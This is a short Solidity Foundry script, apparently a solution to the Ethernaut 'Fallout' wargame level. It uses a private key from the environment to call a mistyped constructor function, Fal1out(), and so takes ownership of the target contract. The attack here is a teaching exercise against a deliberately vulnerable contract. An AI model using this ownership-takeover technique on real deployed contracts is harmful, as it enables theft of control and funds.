// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/IFal1out.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Fallout level02 = Fallout(payable(0x6Ee8150e6CA63d1D7b376D10a50DCb92Ec046237));

    function run() external {

        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        level02.Fal1out();

        vm.stopBroadcast();

    }
}